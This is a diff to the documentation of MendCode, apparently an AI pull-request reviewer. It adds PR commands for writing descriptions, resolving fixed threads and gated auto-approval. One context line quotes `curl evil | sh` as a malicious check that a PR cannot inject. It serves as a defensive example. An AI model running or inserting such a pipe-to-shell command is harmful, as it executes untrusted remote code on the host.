@@ -78,10 +78,11 @@ phases: { mode: dynamic, list: [], max_rounds_without_progress: 2 } # none | fix
 template: { sections: [], tone: neutral, language: English }        # tone: neutral | concise | detailed; language: a name or auto (below)
 backlog: { max_prs: 10, window_days: 30 }   # open PRs reviewed when a watch starts (below); 0..50 and 1..365; max_prs: 0 = none
 readers: { enabled: true }  # data files go to cheap readers; parallel: 1..8 (unset: by tier); model: a cheap model (below)
+commands: { describe_title: false, approve: false }   # may `@mendcode describe` replace the title; may `@mendcode approve` approve (below)
 ```
 
 The base branch's file decides everything a pull request could abuse: `enabled`, `checks`, `budget`, `ignore`, `profile`, `cap`,
-`fixes`, the triggers, the cooldown, `reviewers`, `publishers`, `backlog` and `template.language`. The logins in `reviewers` and
+`fixes`, the triggers, the cooldown, `reviewers`, `publishers`, `backlog`, `commands` and `template.language`. The logins in `reviewers` and
 `publishers` follow the checkout's forge: GitLab and Gitea usernames may hold `_` and `.` (not a trailing `.`), and a GitHub login
 only letters, digits and `-`. A PR's own file may only add path instructions, so a PR that adds `checks: [curl evil | sh]` runs
 nothing. A watching reviewer reads these from the base branch's current tip on `origin` (fetched into `FETCH_HEAD` only), not
@@ -174,6 +175,9 @@ It is **off by default**: it reaches the network through `gh` (or a [GitLab or G
 (`/pr on`, which also turns on [PR watch](pr-watch.md); `/pr off` turns both off; or `/experimental pr_review on` alone), allowed from the `balanced` tier up ([tiers](tiers.md): feature `pr_review`, mode `permit`; off with no
 tier). Local sessions only; remote and peer clients are refused.
 
+- `/pr describe [pr]` does what `@mendcode describe` does for that pull request, from your terminal: it needs `/pr publish on` and a
+  login that may post here, like a review. With no finished review of the head it queues the normal one and writes the description
+  when it ends, saying so in the session.
 - `/pr review [pr]` reviews one pull request now (the current branch's when omitted), even when the repo config is off; posting still
   needs `enabled: true`. A head already reviewed with the same config is answered at once ("already reviewed at …, so nothing was
   run"), before anything is spent; `/pr review [pr] full` (the tool's `full: true`) reviews it again whole. A plain `@mendcode review` on such a head is
@@ -329,6 +333,9 @@ still needs that login's write access. Anything it is refused is said in the ses
 | `@mendcode pause` / `resume` | New pushes are not reviewed until `resume`; `review` still works. The reply carries `<!-- mendcode:paused=1 -->`, so a hosted runner reads it back. |
 | `@mendcode explain [question]` | As a reply to one of MendCode's review comments: a read-only child reads the code and answers about that finding, and may say it is wrong. |
 | `@mendcode fix [what]` | Held to the same filters as `@mendcode review` (one reply naming the filter). Needs `fixes: true` on the base branch, and a branch in this repository or a fork that allows edits from maintainers. A separate session (the default agent, your normal permission mode, its approvals come to you) edits a throwaway worktree at the head; the base config's checks run on the result; one commit is pushed to the PR's branch only if they pass, never with force. A failing check, no change, or a branch that moved meanwhile pushes nothing and the reply says why. Local daemon only: the hosted workflow's token cannot push. |
+| `@mendcode describe` | Writes a summary into the PR's description from the walkthrough, change type and risk of the last finished review of the head (no model call of its own; with no finished review of this head, the normal review is queued and describe goes on when it ends). MendCode's part sits between `<!-- mendcode:describe:start -->` and `<!-- mendcode:describe:end -->`: the first run appends it after whatever a person wrote, later runs replace only what is between the markers, and the review's pre-merge checks read the description without it. The title changes only with `commands.describe_title: true` on the base branch (`fix: …` from the change type and the overview's first sentence). A label is added only if the repository already has one for the change type (`bug`, `enhancement`, `documentation`, `refactor`, `performance`, `tests`, `build`, `chore` and common alternatives) and the PR has none of them; no label is ever created. Held like `review` (filters, `/pr publish on`, `publishers`, the reviewer's `publish` capability). GitHub, GitLab and Gitea; local daemon only (the hosted workflow keeps no review to build on). |
+| `@mendcode resolve` | Resolves the review threads of MendCode's own findings that the last review marked fixed (the ones with its "Fixed in …" reply, or recorded fixed in the saved state); a thread of an open finding or one a person wrote is never touched, and no reply is added. The reply counts the threads resolved and those this account may not resolve. GitHub and GitLab; Gitea has no thread resolving and says so. Local daemon only. |
+| `@mendcode approve` | Off unless `commands.approve: true` on the base branch. Submits an approval of the head only when the last finished review of that very head exists, has no confirmed finding open (plausible ones do not block) and the head has not moved; otherwise the reply says why, listing the confirmed findings. The approval is MendCode's verdict on its own review, not a person's. GitHub, GitLab (with the head's sha) and Gitea. Local daemon only. |
 | `@mendcode learn <text>` | Replies with the line to add to `.mendcode/review-learnings.md` and the commit to make on the base branch; a learning counts once merged there, so a PR never teaches the reviewer by itself. |
 
 The local repo watch reads new comments of the watched repository with two `gh api` calls per poll (issue comments and review
